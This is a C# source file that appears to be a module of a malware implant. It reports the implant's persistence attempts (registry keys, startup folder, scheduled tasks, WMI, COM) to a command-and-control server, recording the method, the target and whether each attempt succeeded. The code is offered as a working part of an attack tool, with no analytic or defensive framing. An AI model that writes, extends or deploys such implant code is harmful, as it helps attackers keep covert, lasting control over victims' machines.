using System;
using System.Collections.Generic;

namespace XYZ.modules.reporters
{
    /// <summary>
    /// Reports persistence attempts (success/failure) to C2
    /// </summary>
    public class PersistenceReporter
    {
        public const string REPORT_TYPE = "persistence_attempt";

        /// <summary>
        /// Report a persistence attempt
        /// </summary>
        /// <param name="method">Method used: registry, startup_folder, scheduled_task, wmi, com</param>
        /// <param name="target">Target path/key/task name</param>
        /// <param name="success">Whether the attempt succeeded</param>
        /// <param name="errorMessage">Error message if failed</param>
        /// <param name="errorCode">Error code if available</param>
        public static void Report(string method, string target, bool success, 
            string errorMessage = null, int? errorCode = null)
        {
            var data = new Dictionary<string, object>
            {
                { "method", method },
                { "target", target },
                { "success", success },
                { "error_message", errorMessage },
                { "error_code", errorCode },
                { "attempted_at", DateTime.UtcNow.ToString("o") }
            };

            TelemetryAggregator.QueueReport(REPORT_TYPE, data);
            
            // Also log locally for debugging
            string status = success ? "SUCCESS" : "FAILED";
            SecureLogger.LogInfo("PersistenceReporter", 
                string.Format("Persistence [{0}] {1}: {2} - {3}", method, status, target, errorMessage ?? "OK"));
        }

        /// <summary>
        /// Report registry persistence attempt
        /// </summary>
        public static void ReportRegistry(string keyPath, string valueName, bool success, string error = null)
        {
            Report("registry", string.Format("{0}\\{1}", keyPath, valueName), success, error);
        }

        /// <summary>
        /// Report startup folder persistence attempt
        /// </summary>
        public static void ReportStartupFolder(string filePath, bool success, string error = null)
        {
            Report("startup_folder", filePath, success, error);
        }

        /// <summary>
        /// Report scheduled task persistence attempt
        /// </summary>
        public static void ReportScheduledTask(string taskName, bool success, string error = null)
        {
            Report("scheduled_task", taskName, success, error);
        }

        /// <summary>
        /// Report WMI persistence attempt
        /// </summary>
        public static void ReportWMI(string eventName, bool success, string error = null)
        {
            Report("wmi", eventName, success, error);
        }
    }
}
